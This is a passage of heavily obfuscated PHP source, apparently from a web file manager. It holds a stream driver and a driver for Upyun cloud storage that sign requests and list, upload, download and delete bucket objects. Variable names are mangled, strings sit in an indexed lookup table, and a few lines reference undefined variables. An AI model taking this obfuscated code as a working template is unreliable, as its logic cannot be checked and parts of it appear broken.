$ˆ»ƒÒœ–; return $´ÏÇ‰ôş; } public static function errorTips($àô»¹Ì = false) { $º°Ò˜£é =& $_SERVER[ªÏ§Ë·]; static $óÕ•õÊÛ = array(); $È¸“ÌµŒ = 1000; if ($àô»¹Ì === -1) { return $óÕ•õÊÛ ? $óÕ•õÊÛ[count($óÕ•õÊÛ) - 1] : $º°Ò˜£é[12]; } if ($àô»¹Ì === !1) { return implode($º°Ò˜£é[19], $óÕ•õÊÛ); } if (count($óÕ•õÊÛ) >= $È¸“ÌµŒ) { $óÕ•õÊÛ = array_slice($óÕ•õÊÛ, $È¸“ÌµŒ * 0.5, $È¸“ÌµŒ); } $óÕ•õÊÛ[] = $àô»¹Ì; write_log($º°Ò˜£é[172] . ACTION . $º°Ò˜£é[1206] . $àô»¹Ì, $º°Ò˜£é[1207]); } public static function getLastError($ ¨·ó¼¢ = '') { $ØÁ‚ƒèŒ = self::errorTips(-1); return $ØÁ‚ƒèŒ ? $ØÁ‚ƒèŒ : $ ¨·ó¼¢; } } goto CÔÏŠ¡¿à¡; d…Œ‚ªÉÊ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($–ü¢÷¬, $ÕŸÕ—Âß = 0) { parent::__construct(); $this->source = $–ü¢÷¬; $this->sourceSize = $ÕŸÕ—Âß; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($µ‘ÅÃˆü = false) { return $this->sourceSize; } public function getContent($ğ“«òšº = false) { return $this->fileSubstr($ğ“«òšº, 0, $this->sourceSize); } public function fileSubstr($æ·ôÙóë = false, $ë†ÀÓØİ = 0, $„íĞÈš = 0) { if (!$„íĞÈš) { $„íĞÈš = $this->sourceSize; } $€Å¡Ê˜“ = $this->sourceSize - $ë†ÀÓØİ; if ($„íĞÈš >= $€Å¡Ê˜“) { $„íĞÈš = $€Å¡Ê˜“; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ë†ÀÓØİ, $„íĞÈš); } if ($this->sourceType == self::TYPE_FILE) { if ($„íĞÈš <= 0) { return $_SERVER[ªÏ§Ë·][12]; } $Ãå£ÇüÍ = ftell($this->source); fseek_64($this->source, $Ãå£ÇüÍ + $ë†ÀÓØİ); $İ‡Ğß«µ = @fread($this->source, $„íĞÈš); fseek_64($this->source, $Ãå£ÇüÍ); return $İ‡Ğß«µ; } } public function hashMd5($¡êÎ½ªŸ = false) { return md5($this->getContent()); } public static function hash($ÈãÂÖ•, $™‰¤œää = 0) { $ïî“£€ = new PathDriverStream($ÈãÂÖ•, $™‰¤œää); return $ïî“£€->hashSimple($ÈãÂÖ•); } public static function md5($ŒêêÂã¡, $„¾ş÷¥ = 0) { $‡¤šÒÏ = new PathDriverStream($ŒêêÂã¡, $„¾ş÷¥); return $‡¤šÒÏ->hashMd5($ŒêêÂã¡); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\x3a\x2f\57\166\60\56\x61\160\x69\x2e\x75\160\171\165\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ÇÉ×£ëÖ) { parent::__construct(); $this->_init($ÇÉ×£ëÖ); } public function _init($±èÏ÷“Ä) { $Ì—ğì =& $_SERVER[ªÏ§Ë·]; foreach ($±èÏ÷“Ä as $ˆÔåÆñú => $¬Ï½ Ìå) { if (isset($this->{$ˆÔåÆñú})) { $this->{$ˆÔåÆñú} = $¬Ï½ Ìå; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ì—ğì[1465] . LNG($Ì—ğì[1396])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Ì­İŸº¨, $¾¶êÌ¦ = "\x47\105\124") { $Ë—ıø¯µ =& $_SERVER[ªÏ§Ë·]; $»½æŠ‰ = gmdate($Ë—ıø¯µ[1429]); $”ıÕ¶« = base64_encode(hash_hmac($Ë—ıø¯µ[1466], "{$¾¶êÌ¦}\x26{$Ì­İŸº¨}\x26{$»½æŠ‰}", md5("{$this->userpass}"), !0)); $ã¥¸£Ü = array("\x41\165\164\150\x6f\162\x69\172\x61\164\x69\x6f\x6e\x3a\125\120\131\125\x4e\40{$this->username}\x3a{$”ıÕ¶«}", "\104\141\164\145\x3a{$»½æŠ‰}"); return $ã¥¸£Ü; } public function ussRequest($¾¬ŞîÂ‡, $şÎÈë•… = "\x47\x45\124", $úúÜÊ¹· = false, $«´à¯×­ = false, $öÑŒïÆ = false) { $Æ€¸€… =& $_SERVER[ªÏ§Ë·]; $¾¬ŞîÂ‡ = trim($¾¬ŞîÂ‡, $Æ€¸€…[8]); $ ¬Óß”» = "\57{$this->bucket}\x2f{$¾¬ŞîÂ‡}"; $ï¢œáÅä = $this->ussHeaders($ ¬Óß”», $şÎÈë•…); if ($«´à¯×­) { $ï¢œáÅä = array_merge($ï¢œáÅä, $«´à¯×­); } $ä¬ª„• = url_request($this->endpoint . $ ¬Óß”», $şÎÈë•…, $úúÜÊ¹·, $ï¢œáÅä, $öÑŒïÆ); if (!$ä¬ª„•) { return array($Æ€¸€…[1237] => !1, $Æ€¸€…[1227] => $Æ€¸€…[1467]); } if (strtolower($şÎÈë•…) == $Æ€¸€…[207] || in_array($ä¬ª„•[$Æ€¸€…[1237]], array($Æ€¸€…[251], $Æ€¸€…[1468]))) { $úúÜÊ¹· = $ä¬ª„•[$Æ€¸€…[1469]]; } else { $úúÜÊ¹· = json_decode($ä¬ª„•[$Æ€¸€…[1227]], !0); if (!$úúÜÊ¹·) { $úúÜÊ¹· = $ä¬ª„•[$Æ€¸€…[1227]]; } else { if (!$ä¬ª„•[$Æ€¸€…[778]] && isset($úúÜÊ¹·[$Æ€¸€…[1470]])) { $úúÜÊ¹· = $úúÜÊ¹·[$Æ€¸€…[1470]]; } } } return array($Æ€¸€…[1237] => $ä¬ª„•[$Æ€¸€…[778]], $Æ€¸€…[1227] => $úúÜÊ¹·); } public function mkfile($ôòµéªƒ, $Ù‹†ş˜Ÿ = '', $µÇÍÇ£Ç = REPEAT_RENAME) { if ($this->setContent($ôòµéªƒ, $Ù‹†ş˜Ÿ)) { return $this->getPathOuter($ôòµéªƒ); } return !1; } public function mkdir($ñÎ½¤, $½çû×¬ = REPEAT_SKIP) { $Š®æ¸ì– =& $_SERVER[ªÏ§Ë·]; $î¸êÕ = trim($ñÎ½¤, $Š®æ¸ì–[8]); if ($this->_isFolder($î¸êÕ)) { return $this->getPathOuter($î¸êÕ); } $Ãª¢ı = array($Š®æ¸ì–[1471]); $ò×¯ı¬ = $this->ussRequest($î¸êÕ, $Š®æ¸ì–[236], !1, $Ãª¢ı); return $ò×¯ı¬[$Š®æ¸ì–[1237]] ? $this->getPathOuter($î¸êÕ) : !1; } public function copyFile($÷û–¹¿ï, $âˆÂÕÓ¨) { $ˆÄÂĞÅ˜ =& $_SERVER[ªÏ§Ë·]; $ÎˆÉ…§ç = array($ˆÄÂĞÅ˜[1472] . "\x2f{$this->bucket}\57{$÷û–¹¿ï}", $ˆÄÂĞÅ˜[1473]); $á²ò·îÀ = $this->ussRequest($âˆÂÕÓ¨, $ˆÄÂĞÅ˜[238], !1, $ÎˆÉ…§ç); return $á²ò·îÀ[$ˆÄÂĞÅ˜[1237]] ? !0 : $this->getPathOuter($âˆÂÕÓ¨); } public function moveFile($¢ÔˆÈĞ, $„«Õó¼Š) { $ØÛ¦ŸÏ° =& $_SERVER[ªÏ§Ë·]; $ìÚ—ş» = array($ØÛ¦ŸÏ°[1474] . "\57{$this->bucket}\57{$¢ÔˆÈĞ}", $ØÛ¦ŸÏ°[1473]); $äş¿Íëš = $this->ussRequest($„«Õó¼Š, $ØÛ¦ŸÏ°[238], !1, $ìÚ—ş»); return $äş¿Íëš[$ØÛ¦ŸÏ°[1237]] ? !0 : $this->getPathOuter($„«Õó¼Š); } public function delFile($ÀµÙç¿) { $†Æ„Şë“ =& $_SERVER[ªÏ§Ë·]; $Â†¦Šåö = $this->ussRequest($ÀµÙç¿, $†Æ„Şë“[1475]); return $Â†¦Šåö[$†Æ„Şë“[1237]] ? !0 : !1; } public function delFolder($‡Ø¥é¯) { $¨õ·ü à =& $_SERVER[ªÏ§Ë·]; if (!$this->exist($‡Ø¥é¯)) { return !0; } $this->listItemCache = !1; $–î®ÑÈ© = $Ø¯•¾ñä = array(); $this->fileList($‡Ø¥é¯, $–î®ÑÈ©, $Ø¯•¾ñä, !0); $this->listItemCache = !0; foreach ($Ø¯•¾ñä as $¿ÍÜÃ³Å) { $ìŒ’êÕˆ = $this->ussRequest($¿ÍÜÃ³Å[$¨õ·ü à[42]], $¨õ·ü à[1475]); if (!$ìŒ’êÕˆ[$¨õ·ü à[1237]]) { return !1; } } foreach ($–î®ÑÈ© as $âÛªñå¯) { $ìŒ’êÕˆ = $this->ussRequest($âÛªñå¯, $¨õ·ü à[1475]); if (!$ìŒ’êÕˆ[$¨õ·ü à[1237]]) { return !1; } } $ìŒ’êÕˆ = $this->ussRequest($‡Ø¥é¯, $¨õ·ü à[1475]); return $ìŒ’êÕˆ[$¨õ·ü à[1237]]; } public function rename($¸µ‹Äİ½, $¿à­Œûë) { if ($this->isFile($¸µ‹Äİ½)) { $¿à­Œûë = get_path_father($¸µ‹Äİ½) . $¿à­Œûë; return $this->moveFile($¸µ‹Äİ½, $¿à­Œûë); } return $this->renameObject($¸µ‹Äİ½, $¿à­Œûë); } public function fileInfo($¨¨åÚ’, $º–Íå¶Û = false, $¢¦œÈÂ = array()) { $æ‰ÎıØã =& $_SERVER[ªÏ§Ë·]; $¯ò¯©âü = array($æ‰ÎıØã[42] => $this->pathThis($¨¨åÚ’), $æ‰ÎıØã[94] => $this->getPathOuter($æ‰ÎıØã[8] . $¨¨åÚ’), $æ‰ÎıØã[43] => $æ‰ÎıØã[210], $æ‰ÎıØã[86] => isset($¢¦œÈÂ[$æ‰ÎıØã[86]]) ? $¢¦œÈÂ[$æ‰ÎıØã[86]] : 0, $æ‰ÎıØã[184] => $this->ext($¨¨åÚ’)); if ($º–Íå¶Û) { return $¯ò¯©âü; } $¯ò¯©âü[$æ‰ÎıØã[211]] = $¯ò¯©âü[$æ‰ÎıØã[95]] = 0; $¯ò¯©âü[$æ‰ÎıØã[212]] = $¯ò¯©âü[$æ‰ÎıØã[213]] = !0; if (empty($¢¦œÈÂ)) { $¢¦œÈÂ = $this->objectMeta($¨¨åÚ’); if (!$¢¦œÈÂ) { return $¯ò¯©âü; } } $¯ò¯©âü[$æ‰ÎıØã[211]] = intval($¢¦œÈÂ[$æ‰ÎıØã[1476]]); $¯ò¯©âü[$æ‰ÎıØã[95]] = intval($¢¦œÈÂ[$æ‰ÎıØã[1477]]); $¯ò¯©âü[$æ‰ÎıØã[86]] = $¢¦œÈÂ[$æ‰ÎıØã[86]]; return $¯ò¯©âü; } public function folderInfo($Š˜¤êÑĞ, $»·¯³ìÑ = false) { $®§÷ÑÔà =& $_SERVER[ªÏ§Ë·]; $½¸áÀ‹ = array($®§÷ÑÔà[42] => $this->pathThis($Š˜¤êÑĞ), $®§÷ÑÔà[94] => $this->getPathOuter($®§÷ÑÔà[8] . $Š˜¤êÑĞ), $®§÷ÑÔà[43] => $®§÷ÑÔà[85]); if ($»·¯³ìÑ) { return $½¸áÀ‹; } $½¸áÀ‹[$®§÷ÑÔà[211]] = $½¸áÀ‹[$®§÷ÑÔà[95]] = 0; $½¸áÀ‹[$®§÷ÑÔà[212]] = $½¸áÀ‹[$®§÷ÑÔà[213]] = !0; if (empty($¬ïíƒËÕ)) { $¬ïíƒËÕ = $this->objectMeta($Š˜¤êÑĞ); if (!$¬ïíƒËÕ) { return $½¸áÀ‹; } } $½¸áÀ‹[$®§÷ÑÔà[211]] = intval($¬ïíƒËÕ[$®§÷ÑÔà[1476]]); $½¸áÀ‹[$®§÷ÑÔà[95]] = intval($¬ïíƒËÕ[$®§÷ÑÔà[1477]]); return $½¸áÀ‹; } private function listObjs($ÎÎ£ª†Å, $ó¬³¦ˆ± = 0, $Ğ–ü×“ş = 1000) { $§·ßËøÀ =& $_SERVER[ªÏ§Ë·]; $œÉ¤¯¢‘ = array($§·ßËøÀ[1478], $§·ßËøÀ[1479] . $Ğ–ü×“ş); if ($ó¬³¦ˆ±) { $œÉ¤¯¢‘[] = $§·ßËøÀ[1480] . $ó¬³¦ˆ±; } $„ òš÷ = $this->ussRequest($ÎÎ£ª†Å, $§·ßËøÀ[240], !1, $œÉ¤¯¢‘); return !$„ òš÷[$§·ßËøÀ[1237]] ? !1 : $„ òš÷[$§·ßËøÀ[1227]]; } private function fileList($Êá¯»óÔ, &$¥ˆµŠ¸ƒ, &$äÌ´óú, $«ÊÎ±éú = false) { $”¡üÙíÈ =& $_SERVER[ªÏ§Ë·]; $â” ¨ı = $”¡üÙíÈ[12]; $£¿øîÛİ = 1000; $éã¼Öïà = rtrim($Êá¯»óÔ, $”¡üÙíÈ[8]) . $”¡üÙíÈ[8]; while (!0) { check_abort(); $Ø‘œÛÓ¢ = $this->listObjs($Êá¯»óÔ, $â” ¨ı, $£¿øîÛİ); if (!$Ø‘œÛÓ¢) { return !1; } $â” ¨ı = isset($Ø‘œÛÓ¢[$”¡üÙíÈ[1481]]) ? $Ø‘œÛÓ¢[$”¡üÙíÈ[1481]] : $”¡üÙíÈ[12]; $š¾éÈÉ¼ = isset($Ø‘œÛÓ¢[$”¡üÙíÈ[1482]]) ? $Ø‘œÛÓ¢[$”¡üÙíÈ[1482]] : array(); foreach ($š¾éÈÉ¼ as $“®ëéşÈ) { $¬¸á†Ø = $“®ëéşÈ[$”¡üÙíÈ[43]] == $”¡üÙíÈ[85] ? !0 : !1; $™Æİäåñ = ltrim($éã¼Öïà . $“®ëéşÈ[$”¡üÙíÈ[42]], $”¡üÙíÈ[8]) . ($¬¸á†Ø ? $”¡üÙíÈ[8] : $”¡üÙíÈ[12]); $­Ç‰ó• = array($”¡üÙíÈ[42] => $™Æİäåñ, $”¡üÙíÈ[43] => $¬¸á†Ø ? $”¡üÙíÈ[85] : $”¡üÙíÈ[210], $”¡üÙíÈ[86] => $“®ëéşÈ[$”¡üÙíÈ[375]], $”¡üÙíÈ[1477] => $“®ëéşÈ[$”¡üÙíÈ[1483]]); $this->cacheMethodInfoSet($™Æİäåñ, $¬¸á†Ø, $­Ç‰ó•); if ($¬¸á†Ø) { $¥ˆµŠ¸ƒ[] = $™Æİäåñ; if ($«ÊÎ±éú) { $this->fileList($™Æİäåñ, $¥ˆµŠ¸ƒ, $äÌ´óú, $«ÊÎ±éú); } continue; } $äÌ´óú[] = $­Ç‰ó•; } if (count($š¾éÈÉ¼) < $£¿øîÛİ) { break; } } $this->cacheMethodInfoSet($Êá¯»óÔ, !0); } public function listPath($­Ë°ãÎ‹, $ş„­Ÿ—¶ = false) { $®òÜ¶Ë€ =& $_SERVER[ªÏ§Ë·]; $ƒÉ¿©Äå = $‘áÆ®ë¯ = array(); $this->fileList($­Ë°ãÎ‹, $ƒÉ¿©Äå, $‘áÆ®ë¯); foreach ($ƒÉ¿©Äå as $¸Œì–“ò => $ª“¦ûÒ) { $ƒÉ¿©Äå[$¸Œì–“ò] = $this->folderInfo($ª“¦ûÒ, $ş„­Ÿ—¶); } foreach ($‘áÆ®ë¯ as $¸Œì–“ò => $ª“¦ûÒ) { $‘áÆ®ë¯[$¸Œì–“ò] = $this->fileInfo($ª“¦ûÒ[$®òÜ¶Ë€[42]], $ş„­Ÿ—¶, $ª“¦ûÒ); } return array($®òÜ¶Ë€[92] => $ƒÉ¿©Äå, $®òÜ¶Ë€[93] => $‘áÆ®ë¯); } public function has($Ê©™çÅÀ, $µñ”Ô = false, $™¥âÙ³– = true) { $æé¤ÂÍ =& $_SERVER[ªÏ§Ë·]; $Ãı´ÃÉ‚ = $æé¤ÂÍ[12]; $¾ùµˆë = 500; $Ÿ§Óœ§‡ = 0; $¶øÅğ°Ã = 0; $ì¡ÛÜü = rtrim($Ê©™çÅÀ, $æé¤ÂÍ[8]) . $æé¤ÂÍ[8]; while (!0) { check_abort(); $„«Ø©™˜ = $this->listObjs($Ê©™çÅÀ, $Ãı´ÃÉ‚, $¾ùµˆë); if (!$„«Ø©™˜) { return !1; } $Ãı´ÃÉ‚ = isset($„«Ø©™˜[$æé¤ÂÍ[1481]]) ? $„«Ø©™˜[$æé¤ÂÍ[1481]] : $æé¤ÂÍ[12]; $ûèÔ­Š = isset($„«Ø©™˜[$æé¤ÂÍ[1482]]) ? $„«Ø©™˜[$æé¤ÂÍ[1482]] : array(); if (empty($ûèÔ­Š)) { break; } $ÚŞ¢ü®ù = array_filter($ûèÔ­Š, function ($Ïı¨Üá ) { $ãä¾¬² =& $_SERVER[ªÏ§Ë·]; return $Ïı¨Üá [$ãä¾¬²[43]] == $ãä¾¬²[85]; }); $õïĞÂâå = count($ûèÔ­Š); $ÚŞ¢ü®ù = count($ÚŞ¢ü®ù); $¸îî±ƒó = $õïĞÂâå - $ÚŞ¢ü®ù; if ($µñ”Ô) { $¶øÅğ°Ã += $ÚŞ¢ü®ù; $Ÿ§Óœ§‡ += $¸îî±ƒó; if ($õïĞÂâå < $¾ùµˆë) { break; } continue; } if ($™¥âÙ³–) { if ($¸îî±ƒó) { return !0; } } else { if ($ÚŞ¢ü®ù) { return !0; } } if ($õïĞÂâå < $¾ùµˆë) { break; } } if ($µñ”Ô) { return array($æé¤ÂÍ[217] => $Ÿ§Óœ§‡, $æé¤ÂÍ[218] => $¶øÅğ°Ã); } return !1; } public function listAll($Ü©ôï‡×) { $ËŠöŸ‹¸ =& $_SERVER[ªÏ§Ë·]; $¡ÎØıéÚ = $½´Ìì– = array(); $this->fileList($Ü©ôï‡×, $¡ÎØıéÚ, $½´Ìì–, !0); $ÛìöÒ‡­ = array_to_keyvalue($½´Ìì–, $ËŠöŸ‹¸[42]); foreach ($¡ÎØıéÚ as $é³ÆØ’ş) { if (is_string($é³ÆØ’ş)) { $ÛìöÒ‡­[$é³ÆØ’ş] = array($ËŠöŸ‹¸[86] => 0); } } return $this->listAllFiles($Ü©ôï‡×, $ÛìöÒ‡­); } public function canRead($ŞÑú±¨İ) { return $this->exist($ŞÑú±¨İ) ? !0 : !1; } public function canWrite($ŸôıÛ’¤) { return $this->exist($ŸôıÛ’¤) ? !0 : !1; } public function getContent($„­‹Ğ”¦) { return $this->fileSubstr($„­‹Ğ”¦, 0, -1); } public function setContent($êş¼àğç, $Ø‚µş¹ = '') { $ú‰×ñË =& $_SERVER[ªÏ§Ë·]; if (!$Ø‚µş¹) { $Øùü¼Í¨ = $this->ussRequest($êş¼àğç, $ú‰×ñË[236]); return $Øùü¼Í¨[$ú‰×ñË[1237]]; } $ÈèÉ›ø… = $this->tempFile($this->pathThis($êş¼àğç)); file_put_contents($ÈèÉ›ø…, $Ø‚µş¹); if ($this->upload($êş¼àğç, $ÈèÉ›ø…)) { $this->tempFileRemve($ÈèÉ›ø…); return !0; } return !1; } public function fileSubstr($¥¿Ò¹·, $¢“ˆ­ıì, $–ÇÏÈ¶İ) { $ä¼—ÑÀ± =& $_SERVER[ªÏ§Ë·]; if (!($ãº¼Û˜ = $this->link($¥¿Ò¹·))) { return !1; } $¦Œ‹ËÓÌ = !1; if ($–ÇÏÈ¶İ > 0) { $×¬°à¾Ù = $¢“ˆ­ıì + $–ÇÏÈ¶İ - 1; $¦Œ‹ËÓÌ = array($ä¼—ÑÀ±[1444] . $¢“ˆ­ıì . $ä¼—ÑÀ±[424] . $×¬°à¾Ù); } $×Œö‹–• = url_request($ãº¼Û˜, $ä¼—ÑÀ±[240], !1, $¦Œ‹ËÓÌ); return $×Œö‹–•[$ä¼—ÑÀ±[778]] ? $×Œö‹–•[$ä¼—ÑÀ±[1227]] : !1; } public function upload($ÓãÎÏâ×, $¶û¦Àßı, $ù…‹É¿´ = false, $Üö¾Â€Ù = REPEAT_REPLACE) { $ìÊš€ÃÎ =& $_SERVER[ªÏ§Ë·]; $î™¹çˆù = IO::size($¶û¦Àßı); if ($î™¹çˆù <= 1024 * 1024 * 200) { $Ì›„ĞùÕ = array($ìÊš€ÃÎ[1484] . $¶û¦Àßı); $­ùğËì‰ = $this->ussRequest($ÓãÎÏâ×, $ìÊš€ÃÎ[238], $Ì›„ĞùÕ); return $­ùğËì‰[$ìÊš€ÃÎ[1237]] ? $this->getPathOuter($ÓãÎÏâ×) : !1; } $ª¥İ¹šú = 1024 * 1024 * 10; $ÃóÖ´ˆ = array($ìÊš€ÃÎ[1485], $ìÊš€ÃÎ[1486] . $î™¹çˆù, $ìÊš€ÃÎ[1487], $ìÊš€ÃÎ[1488] . $ª¥İ¹šú); $­ùğËì‰ = $this->ussRequest($ÓãÎÏâ×, $ìÊš€ÃÎ[238], !1, $ÃóÖ´ˆ); if (!$­ùğËì‰[$ìÊš€ÃÎ[1237]]) { return !1; } $±É×±Æ = $­ùğËì‰[$ìÊš€ÃÎ[1227]]; $§¦ç™» = 0; $ù¹‘„ËÉ = $±É×±Æ[$ìÊš€ÃÎ[1489]]; $íá§§ÃÚ = fopen($¶û¦Àßı, $ìÊš€ÃÎ[1392]); if (!$íá§§ÃÚ) { return !1; } do { $Ëµíšô” = $±É×±Æ[$ìÊš€ÃÎ[1490]]; fseek_64($íá§§ÃÚ, $§¦ç™»); $åşôæè = fread($íá§§ÃÚ, $Ëµíšô”); $åéÜ£İ = 0; do { $åéÜ£İ++; $±É×±Æ = $this->uploadPart($ÓãÎÏâ×, $±É×±Æ, $åşôæè); } while (!$±É×±Æ && $åéÜ£İ < 3); if (!$±É×±Æ) { return !1; } $ù¹‘„ËÉ = $±É×±Æ[$ìÊš€ÃÎ[1489]]; $§¦ç™» += $Ëµíšô”; } while ($ù¹‘„ËÉ != -1); fclose($íá§§ÃÚ); $ÃóÖ´ˆ = array($ìÊš€ÃÎ[1491], $ìÊš€ÃÎ[1492] . $±É×±Æ[$ìÊš€ÃÎ[1493]], $ìÊš€ÃÎ[1487]); $­ùğËì‰ = $this->ussRequest($ÓãÎÏâ×, $ìÊš€ÃÎ[238], !1, $ÃóÖ´ˆ); return $­ùğËì‰[$ìÊš€ÃÎ[1237]] ? $this->getPathOuter($Î÷¸Êš‚) : !1; } private function uploadPart($†’³è¢Æ, $æò˜¶—, &$ìÚë·ú‹) { $¿šïÇå =& $_SERVER[ªÏ§Ë·]; $ÜñıÊ‘ = array($¿šïÇå[1494], $¿šïÇå[1492] . $æò˜¶—[$¿šïÇå[1493]], $¿šïÇå[1495] . $æò˜¶—[$¿šïÇå[1489]], $¿šïÇå[152] . $æò˜¶—[$¿šïÇå[1490]]); $ğü¾çÔš = $this->ussRequest($†’³è¢Æ, $¿šïÇå[238], $ìÚë·ú‹, $ÜñıÊ‘); return !$ğü¾çÔš[$¿šïÇå[1237]] ? $ğü¾çÔš[$¿šïÇå[1237]] : $ğü¾çÔš[$¿šïÇå[1227]]; } public function uploadFormData($ ·ÎŸÀ¿, $‘é²Ü¿ˆ = 3600) { return $this->uploadPolicy($ ·ÎŸÀ¿, $‘é²Ü¿ˆ); } public function multiUploadFormData($Ö™ğ—Ï¡, $Õêï¤² = 3600) { $µ¼¦å£€ =& $_SERVER[ªÏ§Ë·]; $Ó©¤×Ù = (int) $GLOBALS[$µ¼¦å£€[7]][$µ¼¦å£€[86]]; return $this->uploadPolicy($Ö™ğ—Ï¡, $Õêï¤², $Ó©¤×Ù); } private function uploadPolicy($«µàÊø, $Ÿåèø©ü = 3600, $Èï€êè™ = 0) { $“ùç»¾ã =& $_SERVER[ªÏ§Ë·]; $ƒ‚ÑÕÔ¸ = $“ùç»¾ã[8] . $this->bucket; $âå±—úÃ = gmdate($“ùç»¾ã[1429]); $«ïØÑà¤ = array($“ùç»¾ã[1496] => $this->bucket, $“ùç»¾ã[1497] => $«µàÊø, $“ùç»¾ã[1498] => time() + $Ÿåèø©ü, $“ùç»¾ã[1499] => $âå±—úÃ); if ($Èï€êè™) { $«ïØÑà¤[$“ùç»¾ã[1409]] = $Èï€êè™; } $¿³«˜  = base64_encode(json_encode($«ïØÑà¤)); $Şì“¢ôÓ = base64_encode(hash_hmac($“ùç»¾ã[1466], "\x50\x4f\x53\x54\46{$ƒ‚ÑÕÔ¸}\46{$âå±—úÃ}\46{$¿³«˜ }", md5("{$this->userpass}"), !0)); $ÇËĞ‹€ã = array($“ùç»¾ã[270] => $¿³«˜ , $“ùç»¾ã[1500] => "\x55\120\131\125\116\x20{$this->username}\72{$Şì“¢ôÓ}", $“ùç»¾ã[192] => $this->endpoint . $ƒ‚ÑÕÔ¸); return $ÇËĞ‹€ã; } public function download($ˆ»Õ‹¢©, $ÜåÍÈ‹) { $ı’ÇÅ¥× = IO::getPathInner(IO::mkfile($ÜåÍÈ‹)); if (!($«åëè— = $this->link($ˆ»Õ‹¢©))) { return !1; } $ıÙÇƒÖä = 0; $ˆşµÒª¥ = 1024 * 200; $±ÍÁ­ññ = fopen($ı’ÇÅ¥×, $_SERVER[ªÏ§Ë·][1450]); while (!0) { $Ù°„Ú¤Œ = $this->fileSubstr($ˆ»Õ‹¢©, $ıÙÇƒÖä, $ˆşµÒª¥); if ($Ù°„Ú¤Œ === !1) { return !1; } fwrite($±ÍÁ­ññ, $Ù°„Ú¤Œ); $ıÙÇƒÖä += $ˆşµÒª¥; if (strlen($Ù°„Ú¤Œ) < $ˆşµÒª¥) { break; } } fclose($±ÍÁ­ññ); return $ÜåÍÈ‹; } public function link($†Ä’ò¯ß, $áÕùıü = array()) { $¥¿ÔÁ¹§ =& $_SERVER[ªÏ§Ë·]; $†Ä’ò¯ß = trim($†Ä’ò¯ß, $¥¿ÔÁ¹§[8]); if (!empty($this->token)) { $Å¾Ó«‚ù = strtotime(date($¥¿ÔÁ¹§[1501])); $ºãäŞ®î = substr(md5($this->token . $¥¿ÔÁ¹§[322] . $Å¾Ó«‚ù . $¥¿ÔÁ¹§[1502] . $†Ä’ò¯ß), 12, 8) . $Å¾Ó«‚ù; $áÕùıü[] = $¥¿ÔÁ¹§[1503] . $ºãäŞ®î; } $Ù“ğô„€ = !empty($áÕùıü) ? $¥¿ÔÁ¹§[83] . implode($¥¿ÔÁ¹§[322], $áÕùıü) : $¥¿ÔÁ¹§[12]; return $this->getHost() . $¥¿ÔÁ¹§[8] . $†Ä’ò¯ß . $Ù“ğô„€; } public function fileOut($’ÚüÊÎ, $´¹«Ğç“ = false, $ç¡Íş’¦ = false, $ì´şÛñÔ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($’ÚüÊÎ, $´¹«Ğç“, $ç¡Íş’¦, $ì´şÛñÔ); } if (!$ç¡Íş’¦) { $ç¡Íş’¦ = $this->pathThis($’ÚüÊÎ); } $ÄÔºÈ = $´¹«Ğç“ ? array($_SERVER[ªÏ§Ë·][1504] . rawurlencode($ç¡Íş’¦)) : array(); $ÀãÎ×÷í = $this->link($’ÚüÊÎ, $ÄÔºÈ); $this->fileOutLink($ÀãÎ×÷í); } public function fileOutServer($šÄ¯ˆÖ¡, $»¤Ëåïá = false, $„¡ı§Õ¬ = false, $ßÆÌÃÚÑ = '') { parent::fileOut($šÄ¯ˆÖ¡, $»¤Ëåïá, $„¡ı§Õ¬, $ßÆÌÃÚÑ); } public function fileOutImage($èÔ­ÏşŸ, $°äİëü = 250) { $©‡˜ø‹ = $this->link($èÔ­ÏşŸ . $_SERVER[ªÏ§Ë·][1505] . $°äİëü); $this->fileOutLink($©‡˜ø‹); } public function fileOutImageServer($®âŒ¦ä®, $³ÛÁ¼ = 250) { parent::fileOutImage($®âŒ¦ä®, $³ÛÁ¼); } public function hashMd5($ìÙÀ±ÀÈ) { $¬“¥È‘ =& $_SERVER[ªÏ§Ë·]; $ÁÕ¤ĞÂ = $this->_objectMeta($ìÙÀ±ÀÈ); return isset($ÁÕ¤ĞÂ[$¬“¥È‘[222]]) ? $ÁÕ¤ĞÂ[$¬“¥È‘[222]] : !1; } public function size($ë²’¸Ó€) { $‹á”ü¿Õ = $this->objectMeta($ë²’¸Ó€); return $‹á”ü¿Õ ? $‹á”ü¿Õ[$_SERVER[ªÏ§Ë·][86]] : 0; } public function info($‚¨…”îã) { if ($this->isFolder($‚¨…”îã)) { return $this->folderInfo($‚¨…”îã); } else { if ($this->isFile($‚¨…”îã)) { return $this->fileInfo($‚¨…”îã); } } return !1; } public function exist($ÁşãÙ…ë) { return $this->isFile($ÁşãÙ…ë) || $this->isFolder($ÁşãÙ…ë); } public function isFile($³²˜ê«Û) { return !$this->isFolder($³²˜ê«Û) && $this->objectMeta($³²˜ê«Û); } public function isFolder($°ôŸ»À®) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][175], $°ôŸ»À®); } protected function objectMeta($Šû¨÷õ®) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][177], $Šû¨÷õ®); } protected function _objectMeta($·°Ú•”) { $œ™ğ­Ï• =& $_SERVER[ªÏ§Ë·]; if ($·°Ú•” == $œ™ğ­Ï•[12] || $·°Ú•” == $œ™ğ­Ï•[8]) { return array(); } $«Ğş í¦ = $this->ussRequest($·°Ú•”, $œ™ğ­Ï•[1506]); if (!$«Ğş í¦[$œ™ğ­Ï•[1237]]) { return null; } $ªó—ğ¿ = isset($«Ğş í¦[$œ™ğ­Ï•[1227]]) ? $«Ğş í¦[$œ™ğ­Ï•[1227]] : array(); if (!isset($ªó—ğ¿[$œ™ğ­Ï•[1507]])) { return null; } $ØÜ‚ÓüÓ = array($œ™ğ­Ï•[43] => isset($ªó—ğ¿[$œ™ğ­Ï•[1507]]) ? 